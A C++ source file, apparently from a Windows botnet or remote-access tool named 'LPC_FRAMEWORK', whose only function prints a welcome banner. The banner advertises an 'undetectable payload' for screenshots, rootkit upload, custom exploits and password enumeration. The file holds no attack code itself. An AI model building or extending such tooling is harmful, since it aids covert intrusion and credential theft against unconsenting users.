#include "Animations.h"


void Animations::Welcome()
{
	SetColor(2);
	std::cout << "[*] You have now access to the payload, be sure to check all options by taping : help" << std::endl << std::endl;
	SetColor(10);
	std::cout << "BOTNET Version : " << VERSION << std::endl << std::endl;
	SetColor(2);

	std::cout <<"\t\t[ #--------------# Welcome to the LPC_FRAMEWORK #------------#]" << std::endl;
	std::cout <<"\t\t[ #--------------#       Le Petit Cheval        #------------#]" << std::endl;
	std::cout <<"\t\t[ Fully undetectable payload.It allows you to do basic tricks ]" << std::endl;
	std::cout <<"\t\t[ like screenshot, upload rootkit,custom exploit,enum password]" << std::endl;
	std::cout <<"\t\t[ #--------------------MADE BY HUGO MATH----------------------#]" << std::endl;
	std::cout <<"\t\t[ # Author            : Hugo Math                            #]" << std::endl;
	std::cout <<"\t\t[ # Script Developers : Hugo Math && Lucien Leseigle         #]" << std::endl;
	std::cout << "\t\t[ # Contributors      : Hugo Math && Lucien Leseigle         #]" << std::endl;
	std::cout << "[*] WARNING this handler only works on Windows" << std::endl;
	SetColor(7);
}